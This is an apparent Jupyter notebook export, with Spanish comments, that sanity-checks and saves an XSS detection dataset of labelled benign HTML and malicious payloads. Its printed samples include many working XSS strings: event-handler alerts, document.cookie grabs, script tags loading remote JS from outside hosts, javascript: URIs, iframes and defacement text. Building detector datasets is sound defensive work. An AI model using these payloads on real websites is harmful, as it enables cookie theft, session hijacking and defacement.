# 2492                                                                                                                                                                                       http://1113982867/
# 2587                                                                                                                                                                                                &#x00003C
# 2665                                                                                                                                                                           document.getElementsByName("")
# 3071  <EMBED SRC="......
# 3125                                                                                                                                                               document.getElementsByClassName("example")
# 3187                                                                                                                                                                                               (alert)(1)
# 3444                                                                                                                                                                        <A HREF="http://1113982867/"></A>
#
#       Label    families_str  len_after_clean  source family_main  \
# 71        1           other               41  kaggle      benign
# 178       1           other               14  kaggle      benign
# 257       1           other               57  kaggle      benign
# 268       1           other               18  kaggle      benign
# 300       1  maybe_polyglot               36  kaggle      benign
# 399       1           other               15  kaggle      benign
# 424       1           other               30  kaggle      benign
# 516       1           other              107  kaggle      benign
# 519       1           other               20  kaggle      benign
# 520       1           other               47  kaggle      benign
# 580       1           other               12  kaggle      benign
# 588       1           other               34  kaggle      benign
# 1203      1           other               42  kaggle      benign
# 1214      1           other               35  kaggle      benign
# 1312      1       image_tag              217  kaggle      benign
# 1357      1           other                5  kaggle      benign
# 1754      1           other               11  kaggle      benign
# 2068      1           other               63  kaggle      benign
# 2141      1           other               32  kaggle      benign
# 2199      1           other               13  kaggle      benign
# 2226      1           other               32  kaggle      benign
# 2407      1           other               38  kaggle      benign
# 2453      1           other               12  kaggle      benign
# 2492      1           other               18  kaggle      benign
# 2587      1           other                9  kaggle      benign
# 2665      1           other               30  kaggle      benign
# 3071      1  maybe_polyglot              425  kaggle      benign
# 3125      1           other               42  kaggle      benign
# 3187      1           other               10  kaggle      benign
# 3444      1           other               33  kaggle      benign
#
#       has_script_tag  has_event  has_js_uri  has_iframe
# 71             False      False       False       False
# 178            False      False       False       False
# 257            False      False       False       False
# 268            False      False       False       False
# 300            False      False       False       False
# 399            False      False       False       False
# 424            False      False       False       False
# 516            False      False       False       False
# 519            False      False       False       False
# 520            False      False       False       False
# 580            False      False       False       False
# 588            False      False       False       False
# 1203           False      False       False       False
# 1214           False      False       False       False
# 1312           False      False       False       False
# 1357           False      False       False       False
# 1754           False      False       False       False
# 2068           False      False       False       False
# 2141           False      False       False       False
# 2199           False      False       False       False
# 2226           False      False       False       False
# 2407           False      False       False       False
# 2453           False      False       False       False
# 2492           False      False       False       False
# 2587           False      False       False       False
# 2665           False      False       False       False
# 3071           False      False       False       False
# 3125           False      False       False       False
# 3187           False      False       False       False
# 3444           False      False       False       False
# Total: 404
#
# === Benignos (Label=0) clasificados como script/event/iframe/js_uri ===
#                                                                                                                                                                                                Sentence_clean  \
# 108                                                                                                                                                           <script src="_static/js/hoverxref.js"></script>
# 406                                                                                                                                                                                                 </script>
# 1208                                                                                                                                                                <script src="_static/jquery.js"></script>
# 1720                                                                                                                                                                          <script type="text/javascript">
# 1812                                                                                                                                                         <script src="_static/language_data.js"></script>
# 2134                                                                                                                                   <meta name="viewport" content="width=device-width, initial-scale=1.0">
# 2420                                                                                                                                               <meta name="generator" content="MediaWiki 1.35.0-wmf.22"/>
# 2769                                                                                                                               <script type="text/javascript" src="_static/readthedocs-data.js"></script>
# 3287                                                                                                                               <script type="text/javascript" src="_static/js/modernizr.min.js"></script>
# 3565                                                                                                                                                    <meta name="ResourceLoaderDynamicStyles" content=""/>
# 4038                                                                            <script type="text/javascript" id="documentation_options" data-url_root="./" src="_static/documentation_options.js"></script>
# 4122                                                                                                                                             <script src="_static/js/tooltipster.bundle.min.js"></script>
# 4191                                                                                                        <script src="https://assets.readthedocs.org/static/javascript/readthedocs-doc-embed.js"></script>
# 4337                                                                                 <script type="text/javascript" src="https://assets.readthedocs.org/static/javascript/readthedocs-analytics.js"></script>
# 4383                                                                                                                                       <script type="text/javascript" src="_static/js/theme.js"></script>
# 4927  <link rel="stylesheet" href="/w/load.php?lang=en&amp;modules=ext.cite.styles%7Cext.flaggedRevs.basic%2Cicons%7Cext.uls.interlanguage%7Cext.visualEditor.desktopArticleTarget.noscript%7Cext.wikimedi...
# 5353                                                                                              <link rel="stylesheet" href="/w/load.php?lang=en&amp;modules=site.styles&amp;only=styles&amp;skin=vector"/>
# 5553                                                                                                                                                <meta name="referrer" content="origin-when-crossorigin"/>
# 5800                                                                                                                                                                 <meta name="referrer" content="origin"/>
# 6048                                                                                                                                                              <script src="_static/doctools.js"></script>
# 6148                                                                                                                                                            <script src="_static/underscore.js"></script>
# 9736                                                                                                                                               <meta name="referrer" content="origin-when-cross-origin"/>
#
#       Label                  families_str  len_after_clean  source  \
# 108       0                    script_tag               47  kaggle
# 406       0                    script_tag                9  kaggle
# 1208      0                    script_tag               41  kaggle
# 1720      0                    script_tag               31  kaggle
# 1812      0                    script_tag               48  kaggle
# 2134      0                 event_handler               70  kaggle
# 2420      0                 event_handler               58  kaggle
# 2769      0                    script_tag               74  kaggle
# 3287      0                    script_tag               74  kaggle
# 3565      0                 event_handler               53  kaggle
# 4038      0                    script_tag              125  kaggle
# 4122      0                    script_tag               60  kaggle
# 4191      0                    script_tag               97  kaggle
# 4337      0                    script_tag              120  kaggle
# 4383      0                    script_tag               66  kaggle
# 4927      0  event_handler|maybe_polyglot              463  kaggle
# 5353      0  event_handler|maybe_polyglot              107  kaggle
# 5553      0                 event_handler               57  kaggle
# 5800      0                 event_handler               40  kaggle
# 6048      0                    script_tag               43  kaggle
# 6148      0                    script_tag               45  kaggle
# 9736      0                 event_handler               58  kaggle
#
#      family_main  has_script_tag  has_event  has_js_uri  has_iframe
# 108       script            True      False       False       False
# 406       script            True      False       False       False
# 1208      script            True      False       False       False
# 1720      script            True      False       False       False
# 1812      script            True      False       False       False
# 2134       event           False       True       False       False
# 2420       event           False       True       False       False
# 2769      script            True      False       False       False
# 3287      script            True      False       False       False
# 3565       event           False       True       False       False
# 4038      script            True      False       False       False
# 4122      script            True      False       False       False
# 4191      script            True      False       False       False
# 4337      script            True      False       False       False
# 4383      script            True      False       False       False
# 4927       event           False       True       False       False
# 5353       event           False       True       False       False
# 5553       event           False       True       False       False
# 5800       event           False       True       False       False
# 6048      script            True      False       False       False
# 6148      script            True      False       False       False
# 9736       event           False       True       False       False
# Total: 22

# %%
# ============================================
# ANÁLISIS FINAL – SANITY CHECK DEL DATASET
# ============================================

import pandas as pd
import numpy as np

print("=== INFO GENERAL ===")
print("Shape df:", df.shape)
print("Columnas:", list(df.columns))

print("\n=== Distribución Label ===")
print(df["Label"].value_counts())
print("\n=== Distribución Label (proporciones) ===")
print(df["Label"].value_counts(normalize=True).round(3))

print("\n=== Distribución por source ===")
print(df["source"].value_counts())
print("\n=== Label vs source ===")
print(pd.crosstab(df["source"], df["Label"], margins=True))

# --------------------------------------------
# 1. Muestra aleatoria global
# --------------------------------------------
print("\n=== Muestra aleatoria global (15 filas) ===")
display(df.sample(15, random_state=123))

# --------------------------------------------
# 2. Muestras aleatorias por Label
# --------------------------------------------
print("\n=== Ejemplos de BENIGNOS (Label=0) ===")
display(df[df["Label"] == 0].sample(10, random_state=123) if (df["Label"] == 0).sum() >= 10 else df[df["Label"] == 0])

print("\n=== Ejemplos de MALICIOUS (Label=1) ===")
display(df[df["Label"] == 1].sample(10, random_state=456) if (df["Label"] == 1).sum() >= 10 else df[df["Label"] == 1])

# --------------------------------------------
# 3. Si existe family_main, validar que esté coherente
# --------------------------------------------
if "family_main" in df.columns:
    print("\n=== Distribución de family_main ===")
    print(df["family_main"].value_counts())

    print("\n=== family_main vs Label (conteos) ===")
    print(pd.crosstab(df["family_main"], df["Label"], margins=True))

    print("\n=== Ejemplos por family_main y Label ===")
    for fam in df["family_main"].unique():
        for lab in [0, 1]:
            subset = df[(df["family_main"] == fam) & (df["Label"] == lab)]
            if subset.empty:
                continue
            print(f"\n>>> family_main = {fam} | Label = {lab} | n = {subset.shape[0]}")
            display(subset.sample(min(3, subset.shape[0]), random_state=lab+hash(fam) % 1000))

# --------------------------------------------
# 4. Extremos por longitud (para ver rarezas)
# --------------------------------------------
print("\n=== 10 payloads MÁS CORTOS ===")
display(df.sort_values("len_after_clean", ascending=True).head(10))

print("\n=== 10 payloads MÁS LARGOS ===")
display(df.sort_values("len_after_clean", ascending=False).head(10))

# --------------------------------------------
# 5. Check rápido de duplicados
# --------------------------------------------
print("\n=== Duplicados exactos (Sentence_clean + Label) ===")
dup_count = df.duplicated(subset=["Sentence_clean", "Label"]).sum()
print("Total duplicados:", dup_count)

if dup_count > 0:
    print("\nEjemplos de duplicados:")
    dups = df[df.duplicated(subset=["Sentence_clean", "Label"], keep=False)]
    display(dups.head(10))
# Out:
# === INFO GENERAL ===
# Shape df: (15351, 10)
# Columnas: ['Sentence_clean', 'Label', 'families_str', 'len_after_clean', 'source', 'family_main', 'has_script_tag', 'has_event', 'has_js_uri', 'has_iframe']
#
# === Distribución Label ===
# 1    11703
# 0     3648
# Name: Label, dtype: int64
#
# === Distribución Label (proporciones) ===
# 1    0.762
# 0    0.238
# Name: Label, dtype: float64
#
# === Distribución por source ===
# kaggle    10835
# github     4516
# Name: source, dtype: int64
#
# === Label vs source ===
# Label      0      1    All
# source
# github   131   4385   4516
# kaggle  3517   7318  10835
# All     3648  11703  15351
#
# === Muestra aleatoria global (15 filas) ===
#                                                                                                                                         Sentence_clean  \
# 13308  <script>alert(123)</script>][][faq_id,faq_question][]&sch_page=1&sch_limit=10&sch_domain=*&sch_string="><script>alert(2)</script\\\\.&submit=go
# 7900                                                                                              <legend id=x tabindex=1 onfocusin=alert(1)></legend>
# 13913                                                                                                                 <bodyonload="alert('xss - zj')">
# 9742                                                                                                            <xmp onpointerenter=alert(1)>XSS</xmp>
# 3103                                                       <style>@keyframes x{}</style><pre style="animation-name:x" onanimationend="alert(1)"></pre>
# 2752                                                                         <li><a href="#CITEREFNilsson1998">Nilsson 1998 </a>, chpt. 15 </li> </ul>
# 12692                                                  <center><font color=red size=20 face=impact>by+panzerturk+hepsi5+am&#305;nakoim</font></center>
# 8393                                                          <h3><span class="mw-headline" id="Artificial_neural_networks">Artificial neural networks
# 6777                                                                                         <mark onbeforecopy="alert(1)" contenteditable>test</mark>
# 5487                                                                 <basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>
# 6007                  <style>:target {transform: rotate(180deg);}</style><frame id=x style="transition:transform 2s" ontransitionrun=alert(1)></frame>
# 3540                                 <div draggable="true" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>
# 11017   <script>alert("arkada�lar wild 4 m� ney o hacker hepimiz lameriz :d b�rak�n sanal ile sal�nca�a girmi� gibi oynay�p sallans�n lemo�")</script>
# 14783                                                                                                  <script src=http://ompldr.org/vy25ryw></script>
# 14388                                                                                 <body><script src=http://www.securitylab.ru/test/un.js></script>
#
#        Label                  families_str  len_after_clean  source  \
# 13308      1                    script_tag              140  github
# 7900       1                 event_handler               52  kaggle
# 13913      1         body_tag|event_onload               32  github
# 9742       1                 event_handler               38  kaggle
# 3103       1                 event_handler               91  kaggle
# 2752       0                         other               73  kaggle
# 12692      1            text_container_tag               95  github
# 8393       0                         other               88  kaggle
# 6777       1                 event_handler               57  kaggle
# 5487       1                 event_handler               81  kaggle
# 6007       1  event_handler|maybe_polyglot              128  kaggle
# 3540       1                 event_handler              113  kaggle
# 11017      1                    script_tag              142  github
# 14783      1                    script_tag               47  github
# 14388      1           script_tag|body_tag               64  github
#
#       family_main  has_script_tag  has_event  has_js_uri  has_iframe
# 13308      script            True      False       False       False
# 7900        event           False       True       False       False
# 13913       event           False       True       False       False
# 9742        event           False       True       False       False
# 3103        event           False       True       False       False
# 2752       benign           False      False       False       False
# 12692      benign           False      False       False       False
# 8393       benign           False      False       False       False
# 6777        event           False       True       False       False
# 5487        event           False       True       False       False
# 6007        event           False       True       False       False
# 3540        event           False       True       False       False
# 11017      script            True      False       False       False
# 14783      script            True      False       False       False
# 14388      script            True      False       False       False
# === Ejemplos de BENIGNOS (Label=0) ===
#                                                                                                                                                                                                 Sentence_clean  \
# 10444  <li><cite id="CITEREFVinge1993" class="citation journal"><a href="/wiki/Vernor_Vinge" title="Vernor Vinge">Vinge, Vernor </a> (1993). <a rel="nofollow" class="external text" href="http://www-rohan...
# 692    <div role="note" class="hatnote navigation-not-searchable">Main article: <a href="/wiki/Automated_planning_and_scheduling" title="Automated planning and scheduling">Automated planning and scheduli...
# 7190                                                                                            <li><a href="#CITEREFPooleMackworthGoebel1998">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;113–132 </li>
# 5109                                                                                                                          <li class="toclevel-1 tocsection-1"><a href="#History"><span class="tocnumber">1
# 2357       </span><a href="/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=62" title="Edit section: Computationalism and functionalism">edit </a><span class="mw-editsection-bracket">]
# 5346                                                                                      <li class="toctree-l1"><a class="reference internal" href="topics/autothrottle.html">AutoThrottle extension</a></li>
# 986    </span>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Tech+Insider&amp;rft.atitle=The+mysterious+artificial+i...
# 94                                                                                         <li><a href="/wiki/Automated_planning_and_scheduling" title="Automated planning and scheduling">Planning </a> </li>
# 1760                                                                                                                     <li><a href="#CITEREFMcCorduck2004">McCorduck 2004 </a>, pp.&#160;448–449 </li> </ul>
# 8920                                                                                                               </div> </td><td class="navbox-image" rowspan="6" style="width:1px;padding:0px 0px 0px 2px">
#
#        Label    families_str  len_after_clean  source family_main  \
# 10444      0  maybe_polyglot             1197  kaggle      benign
# 692        0           other              210  kaggle      benign
# 7190       0           other              110  kaggle      benign
# 5109       0           other               80  kaggle      benign
# 2357       0  maybe_polyglot              195  kaggle      benign
# 5346       0           other              116  kaggle      benign
# 986        0  maybe_polyglot              481  kaggle      benign
# 94         0           other              115  kaggle      benign
# 1760       0           other               85  kaggle      benign
# 8920       0           other               91  kaggle      benign
#
#        has_script_tag  has_event  has_js_uri  has_iframe
# 10444           False      False       False       False
# 692             False      False       False       False
# 7190            False      False       False       False
# 5109            False      False       False       False
# 2357            False      False       False       False
# 5346            False      False       False       False
# 986             False      False       False       False
# 94              False      False       False       False
# 1760            False      False       False       False
# 8920            False      False       False       False
# === Ejemplos de MALICIOUS (Label=1) ===
#                                                                                                                                                                                                 Sentence_clean  \
# 14357                                                                                                                             <body/**/onload=alert(1)>/modems/descriptions/mdcsmica.inf&swtype=eval&code=
# 12145                                                                                                                                             <script/src=http://kusomiso.com/xss.js></script>&submit=����
# 4543                                                                                                                                                       <link oncopy="alert(1)" contenteditable>test</link>
# 11481  <script>alert("iblaze")</script>&searchdetails.querytype=all&search=search&searchdetails.includeallfields=true&searchdetails.searchall=true&searchdetails.summarylanguage=''&searchdetails.publicati...
# 2488                                                                                                                                                                               <input onauxclick=alert(1)>
# 10017                                                                                                                                                                      <em ondblclick="alert(1)">test</em>
# 14896                                                                                                                                                                             </applet onreadystatechange>
# 1502                                                                                                                                                            <data id=x tabindex=1 onfocus=alert(1)></data>
# 12225                                                                       <script>alert(string.fromcharcode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>\n&newsletter=1&submit=sign up
# 12939                                                                             <script>alert('xss')</script>&submit=cerca+>&as_sitesearch=http://www10.gencat.net/agaur_web&site=default_collection&idioma=
#
#        Label              families_str  len_after_clean  source family_main  \
# 14357      1     body_tag|event_onload               76  github       event
# 12145      1                script_tag               60  github      script
# 4543       1             event_handler               51  kaggle       event
# 11481      1                script_tag              916  github      script
# 2488       1             event_handler               27  kaggle       event
# 10017      1             event_handler               35  kaggle       event
# 14896      1  event_onreadystatechange               28  github       event
# 1502       1             event_handler               46  kaggle       event
# 12225      1                script_tag              129  github      script
# 12939      1                script_tag              124  github      script
#
#        has_script_tag  has_event  has_js_uri  has_iframe
# 14357           False       True       False       False
# 12145            True      False       False       False
# 4543            False       True       False       False
# 11481            True      False       False       False
# 2488            False       True       False       False
# 10017           False       True       False       False
# 14896           False       True       False       False
# 1502            False       True       False       False
# 12225            True      False       False       False
# 12939            True      False       False       False
# === Distribución de family_main ===
# event     7667
# benign    4030
# script    3408
# iframe     210
# js_uri      36
# Name: family_main, dtype: int64
#
# === family_main vs Label (conteos) ===
# Label           0      1    All
# family_main
# benign       3626    404   4030
# event           8   7659   7667
# iframe          0    210    210
# js_uri          0     36     36
# script         14   3394   3408
# All          3648  11703  15351
#
# === Ejemplos por family_main y Label ===
#
# >>> family_main = benign | Label = 0 | n = 3626
#                                                                                                                                                                                                Sentence_clean  \
# 9350  </span>. University of Michigan Press. <a href="/wiki/International_Standard_Book_Number" title="International Standard Book Number">ISBN </a>&#160;<a href="/wiki/Special:BookSources/978-0-262-581...
# 159   <li><cite id="CITEREFLenatGuha1989" class="citation book"><a href="/wiki/Douglas_Lenat" title="Douglas Lenat">Lenat, Douglas </a>; Guha, R. V. (1989). <i>Building Large Knowledge-Based Systems </i...
# 6273                                                                                           <li id="cite_note-sak2014-269"><span class="mw-cite-backlink"><b><a href="#cite_ref-sak2014_269-0">^ </a> </b>
#
#       Label    families_str  len_after_clean  source family_main  \
# 9350      0  maybe_polyglot              746  kaggle      benign
# 159       0  maybe_polyglot              853  kaggle      benign
# 6273      0           other              110  kaggle      benign
#
#       has_script_tag  has_event  has_js_uri  has_iframe
# 9350           False      False       False       False
# 159            False      False       False       False
# 6273           False      False       False       False
# >>> family_main = benign | Label = 1 | n = 404
#                                                            Sentence_clean  \
# 13865  <font+color=red size=70><marquee>xssed_by_samthg</marquee></font><
# 13828                <marquee><h1>defaced_by_ironzorg</h1></marquee>.html
# 3831                                                   top[“al”+”ert”](1)
#
#        Label                    families_str  len_after_clean  source  \
# 13865      1  marquee_tag|text_container_tag               66  github
# 13828      1          marquee_tag|header_tag               52  github
# 3831       1                           other               18  kaggle
#
#       family_main  has_script_tag  has_event  has_js_uri  has_iframe
# 13865      benign           False      False       False       False
# 13828      benign           False      False       False       False
# 3831       benign           False      False       False       False
# >>> family_main = event | Label = 0 | n = 8
#                                                                                                                                                                                                Sentence_clean  \
# 2134                                                                                                                                   <meta name="viewport" content="width=device-width, initial-scale=1.0">
# 9736                                                                                                                                               <meta name="referrer" content="origin-when-cross-origin"/>
# 4927  <link rel="stylesheet" href="/w/load.php?lang=en&amp;modules=ext.cite.styles%7Cext.flaggedRevs.basic%2Cicons%7Cext.uls.interlanguage%7Cext.visualEditor.desktopArticleTarget.noscript%7Cext.wikimedi...
#
#       Label                  families_str  len_after_clean  source  \
# 2134      0                 event_handler               70  kaggle
# 9736      0                 event_handler               58  kaggle
# 4927      0  event_handler|maybe_polyglot              463  kaggle
#
#      family_main  has_script_tag  has_event  has_js_uri  has_iframe
# 2134       event           False       True       False       False
# 9736       event           False       True       False       False
# 4927       event           False       True       False       False
# >>> family_main = event | Label = 1 | n = 7659
#                                                                                                                                                                           Sentence_clean  \
# 4007  <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><samp id=x style="position:absolute;" onanimationcancel="alert(1)"></samp>
# 7280                                                                                                                                             <data onpointermove=alert(1)>XSS</data>
# 9081                                                                                                                                            <abbr onpointerenter=alert(1)>XSS</abbr>
#
#       Label                  families_str  len_after_clean  source  \
# 4007      1  event_handler|maybe_polyglot              178  kaggle
# 7280      1                 event_handler               39  kaggle
# 9081      1                 event_handler               40  kaggle
#
#      family_main  has_script_tag  has_event  has_js_uri  has_iframe
# 4007       event           False       True       False       False
# 7280       event           False       True       False       False
# 9081       event           False       True       False       False
# >>> family_main = js_uri | Label = 1 | n = 36
#                               Sentence_clean  Label    families_str  \
# 10225               URL=javascript:alert('')      1  javascript_uri
# 7468   <BGSOUND SRC="javascript:alert('');">      1  javascript_uri
# 2781                  ="javascript:alert('')      1  javascript_uri
#
#        len_after_clean  source family_main  has_script_tag  has_event  \
# 10225               24  kaggle      js_uri           False      False
# 7468                37  kaggle      js_uri           False      False
# 2781                22  kaggle      js_uri           False      False
#
#        has_js_uri  has_iframe
# 10225        True       False
# 7468         True       False
# 2781         True       False
# >>> family_main = script | Label = 0 | n = 14
#                                                                                                                      Sentence_clean  \
# 1720                                                                                                <script type="text/javascript">
# 1812                                                                               <script src="_static/language_data.js"></script>
# 4038  <script type="text/javascript" id="documentation_options" data-url_root="./" src="_static/documentation_options.js"></script>
#
#       Label families_str  len_after_clean  source family_main  has_script_tag  \
# 1720      0   script_tag               31  kaggle      script            True
# 1812      0   script_tag               48  kaggle      script            True
# 4038      0   script_tag              125  kaggle      script            True
#
#       has_event  has_js_uri  has_iframe
# 1720      False       False       False
# 1812      False       False       False
# 4038      False       False       False
# >>> family_main = script | Label = 1 | n = 3394
#                                                                                                                                                                                                 Sentence_clean  \
# 11613  <script>alert(1)</script></textarea><script>alert("kaksii_was_here")<script>alert('kaksii_was_here');alert(1)</script>"</html><html><script>alert(10111)</script><div align=center> <font size=4><te...
# 12404                                                       <script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>defacing+haxored+hacking+deface+owned+ownz+mass&v=0&c=1&p=1&r=1182830238786
# 11230                                                                                                    <script \n\r>alert(/xss by turkpower - from turkey/);</script><h1>xss by turkpower - from turkey</h1>
#
#        Label                             families_str  len_after_clean  \
# 11613      1  script_tag|plain_tag|text_container_tag              313
# 12404      1        script_tag|marquee_tag|header_tag              146
# 11230      1                    script_tag|header_tag               99
#
#        source family_main  has_script_tag  has_event  has_js_uri  has_iframe
# 11613  github      script            True      False       False       False
# 12404  github      script            True      False       False       False
# 11230  github      script            True      False       False       False
# >>> family_main = iframe | Label = 1 | n = 210
#                                             Sentence_clean  Label  \
# 10870  <iframe+src=http://google.com>>&image.x=0&image.y=0      1
# 11153             <iframe+src="http://xssed.com"></iframe>      1
# 14571                      <iframe/src="http://xssed.com">      1
#
#       families_str  len_after_clean  source family_main  has_script_tag  \
# 10870   iframe_tag               51  github      iframe           False
# 11153   iframe_tag               40  github      iframe           False
# 14571   iframe_tag               31  github      iframe           False
#
#        has_event  has_js_uri  has_iframe
# 10870      False       False        True
# 11153      False       False        True
# 14571      False       False        True
# === 10 payloads MÁS CORTOS ===
#      Sentence_clean  Label families_str  len_after_clean  source family_main  \
# 96            </ul>      0        other                5  kaggle      benign
# 276           </dl>      0        other                5  kaggle      benign
# 83            </li>      0        other                5  kaggle      benign
# 3736          <<tr>      0        other                5  kaggle      benign
# 1101          </h3>      0        other                5  kaggle      benign
# 4932          </div      0        other                5  kaggle      benign
# 3049          }}();      0        other                5  kaggle      benign
# 4545          <h3 >      0        other                5  kaggle      benign
# 4206          </dd>      0        other                5  kaggle      benign
# 133           <div>      0        other                5  kaggle      benign
#
#       has_script_tag  has_event  has_js_uri  has_iframe
# 96             False      False       False       False
# 276            False      False       False       False
# 83             False      False       False       False
# 3736           False      False       False       False
# 1101           False      False       False       False
# 4932           False      False       False       False
# 3049           False      False       False       False
# 4545           False      False       False       False
# 4206           False      False       False       False
# 133            False      False       False       False
# === 10 payloads MÁS LARGOS ===
#                                                                                                                                                                                                 Sentence_clean  \
# 13563  <script >alert(document.cookie)</script>&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=...
# 15209  <p>example usage:</p> *<pre><code>// basic mask:var mymask = new ext.loadmask(ext.getbody(), {msg:\\\\"please wait...\\\\"});mymask.show();</code></pre> * @constructor * create a new loadmask * @p...
# 15230  \\\\'use strict\\\\';var chai = require(\\\\'chai\\\\');chai.assertion.includestack = true;require(\\\\'chai\\\\').should();var expect = require(\\\\'chai\\\\').expect;var nodepath = require(\\\\'...
# 15208  < 1) { js.onload = function(){parent();}; } head.appendchild(js); if(unique_files.length) { parent(); } } else { // otherwise, load them in parallel js.src = file; document.body.appendchild(js); i...
# 10480  </p><p>Artificial intelligence was founded as an academic discipline in 1955, and in the years since has experienced several waves of optimism,<sup id="cite_ref-Optimism_of_early_AI_9-0" class="re...
# 5713   <a href="/wiki/Natural_language_processing" title="Natural language processing">Natural language processing </a><sup id="cite_ref-Natural_language_processing_120-0" class="reference"><a href="#cit...
# 15187  onmouseover="this.style.display='none'; if (document.cookie.indexof('visited')>=0) {} else { document.getelementbyid('wpwrap').innerhtml=atob('pgxpbmsgcmvspsdzdhlszxnozwv0jybpzd0ny29sb3jzlwzyzxnol...
# 15250  <script>ymedia.use("media-rmp", function(y){y.media.rmp.load({"srcnode":"#mediabankrate_container","continueonerror":true,"response":"\\\\r\\\\n--dali-response-split-5731c5f829d1f\\\\r\\\\ncontent...
# 6908   <p>Artificial Intelligence has inspired numerous creative applications including its usage to produce visual art. The exhibition "Thinking Machines: Art and Design in the Computer Age, 1959–1989" ...
# 1438   </p><p>Concern over risk from artificial intelligence has led to some high-profile donations and investments. A group of prominent tech titans including <a href="/wiki/Peter_Thiel" title="Peter Th...
#
#        Label  \
# 13563      1
# 15209      1
# 15230      1
# 15208      1
# 10480      0
# 5713       0
# 15187      1
# 15250      1
# 6908       0
# 1438       0
#
#                                                             families_str  \
# 13563                                                         script_tag
# 15209                                    text_container_tag|event_onload
# 15230                                                       event_onload
# 15208                                         event_onload|event_onerror
# 10480                                                     maybe_polyglot
# 5713                                                      maybe_polyglot
# 15187                                                  event_onmouseover
# 15250  script_tag|iframe_tag|header_tag|text_container_tag|event_onerror
# 6908                                                      maybe_polyglot
# 1438                                                      maybe_polyglot
#
#        len_after_clean  source family_main  has_script_tag  has_event  \
# 13563             2854  github      script            True      False
# 15209             2686  github       event           False       True
# 15230             2685  github       event           False       True
# 15208             2599  github       event           False       True
# 10480             2587  kaggle      benign           False      False
# 5713              2538  kaggle      benign           False      False
# 15187             2501  github       event           False       True
# 15250             2413  github      script            True       True
# 6908              2394  kaggle      benign           False      False
# 1438              2394  kaggle      benign           False      False
#
#        has_js_uri  has_iframe
# 13563       False       False
# 15209       False       False
# 15230       False       False
# 15208       False       False
# 10480       False       False
# 5713        False       False
# 15187       False       False
# 15250       False        True
# 6908        False       False
# 1438        False       False
# === Duplicados exactos (Sentence_clean + Label) ===
# Total duplicados: 0

# %%
# ============================================
# GUARDAR DATASET FINAL LIMPIO
# ============================================
from pathlib import Path

# Si ya tienes OUTPUT_DIR definido en tu notebook/proyecto, úsalo.
# Si no, se guardará en la carpeta actual.
base_dir = Path.cwd()
try:
    output_dir = OUTPUT_DIR  # si existe en tu entorno
except NameError:
    output_dir = base_dir / "data_processed"

output_dir.mkdir(parents=True, exist_ok=True)

path_full   = output_dir / "xss_full_clean_with_families.csv"
path_kaggle = output_dir / "xss_kaggle_clean_with_families.csv"
path_github = output_dir / "xss_github_clean_with_families.csv"

# Dataset completo
df.to_csv(path_full, index=False)

# Subsets por source (útil para entrenar vs probar en tu sistema)
df_kaggle = df[df["source"] == "kaggle"].copy()
df_github = df[df["source"] == "github"].copy()

df_kaggle.to_csv(path_kaggle, index=False)
df_github.to_csv(path_github, index=False)

print("Guardado:")
print("  - Full  :", path_full)
print("  - Kaggle:", path_kaggle, f"(shape: {df_kaggle.shape})")
print("  - GitHub:", path_github, f"(shape: {df_github.shape})")
# Out:
# Guardado:
#   - Full  : d:\Archivos de Usuario\Documents\xss-cookie\notebooks\data\data_processed\xss_full_clean_with_families.csv
#   - Kaggle: d:\Archivos de Usuario\Documents\xss-cookie\notebooks\data\data_processed\xss_kaggle_clean_with_families.csv (shape: (10835, 10))
#   - GitHub: d:\Archivos de Usuario\Documents\xss-cookie\notebooks\data\data_processed\xss_github_clean_with_families.csv (shape: (4516, 10))
